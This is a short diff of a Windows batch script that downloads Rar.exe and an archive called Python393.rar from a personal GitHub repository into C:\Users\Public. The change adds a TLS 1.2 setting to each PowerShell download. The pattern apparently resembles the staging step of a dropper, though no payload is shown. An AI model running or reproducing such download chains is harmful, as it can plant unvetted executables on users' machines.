@@ -2,7 +2,7 @@
 cd /d "C:\Users\Public"
 
 echo Downloading Rar.exe...
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/duane35126869/1/raw/refs/heads/main/Rar.exe' -OutFile 'Rar.exe'"
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/duane35126869/1/raw/refs/heads/main/Rar.exe' -OutFile 'Rar.exe'"
 
 if not exist "Rar.exe" (
     echo Rar.exe download failed
@@ -11,7 +11,7 @@ if not exist "Rar.exe" (
 )
 
 echo Downloading Python393.rar...
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/duane35126869/1/raw/refs/heads/main/Python393.rar' -OutFile 'Python393.rar'"
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/duane35126869/1/raw/refs/heads/main/Python393.rar' -OutFile 'Python393.rar'"
 
 if not exist "Python393.rar" (
     echo Python393.rar download failed
